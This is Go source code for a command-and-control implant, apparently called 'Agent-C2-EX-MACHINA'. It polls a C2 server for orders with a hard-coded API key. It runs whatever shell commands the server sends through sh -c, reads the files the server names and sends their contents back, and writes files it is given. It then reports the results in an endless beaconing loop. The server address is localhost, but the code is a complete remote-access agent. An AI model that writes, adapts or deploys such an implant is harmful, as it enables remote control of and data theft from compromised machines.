package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"
)

func main() {
	fmt.Println("Defined variables")
	var (
		taskStdout string
		taskStderr string
		taskStatus int
		content    []byte
	)

	client := &http.Client{}

	headers := map[string]string{
		"Content-Type": "application/json",
		"User-Agent":   "Agent-C2-EX-MACHINA 0.0.1 (Linux) HP-PC",
		"Api-Key":      "AdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin",
	}

	fmt.Println("Add headers request 1")
	jsonData := []byte(`{"data":"{}"}`)
	req, err := http.NewRequest("GET", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
	if err != nil {
		panic(err)
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	content, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	fmt.Println("Get content response 1")

	for {
		var order map[string]interface{}
		err = json.Unmarshal(content, &order)
		if err != nil {
			panic(err)
		}

		var body []map[string]interface{}

		fmt.Println("Parse JSON")

		for _, task := range order["Tasks"].([]interface{}) {
			fmt.Println("Process task")
			switch task.(map[string]interface{})["Type"].(string) {
			case "COMMAND":
				fmt.Println("startProcess")
				cmd := exec.Command("sh", "-c", task.(map[string]interface{})["Data"].(string))
				var stdout, stderr bytes.Buffer
				cmd.Stdout = &stdout
				cmd.Stderr = &stderr
				err := cmd.Run()
				if err != nil {
					panic(err)
				}
				taskStdout = stdout.String()
				taskStderr = stderr.String()
				taskStatus = cmd.ProcessState.ExitCode()
				fmt.Println("waitForExit")
			case "UPLOAD":
				fmt.Println("readFile")
				fileContent, err := ioutil.ReadFile(task.(map[string]interface{})["Data"].(string))
				if err != nil {
					panic(err)
				}
				taskStdout = string(fileContent)
				taskStderr = ""
				taskStatus = 0
			case "DOWNLOAD":
				fmt.Println("writeFile")
				err := ioutil.WriteFile(task.(map[string]interface{})["Filename"].(string), []byte(task.(map[string]interface{})["Data"].(string)), 0644)
				if err != nil {
					panic(err)
				}
				taskStdout = ""
				taskStderr = ""
				taskStatus = 0
			}

			fmt.Println("body add task result")
			body = append(body, map[string]interface{}{
				"id":     task.(map[string]interface{})["Id"].(float64),
				"stdout": taskStdout,
				"stderr": taskStderr,
				"status": taskStatus,
			})
		}

		nextRequestTime := int(order["NextRequestTime"].(float64))
		timeToSleep := nextRequestTime - int(time.Now().Unix())

		fmt.Println("Sleeping for ", timeToSleep, " seconds")
		time.Sleep(time.Duration(timeToSleep) * time.Second)

		fmt.Println("Add headers request 2")
		jsonData, err := json.Marshal(map[string]interface{}{
			"tasks": body, "data": order["Data"], "id": order["Id"], "nextRequestTime": order["NextRequestTime"], "status": order["Status"],	
		})
		if err != nil {
			panic(err)
		}

		req, err := http.NewRequest("POST", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
		if err != nil {
			panic(err)
		}

		for key, value := range headers {
			req.Header.Set(key, value)
		}
		
		resp, err := client.Do(req)
		if err != nil {
			panic(err)
		}

		defer resp.Body.Close()

		content, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}

		fmt.Println("Get content response 2")
	}
}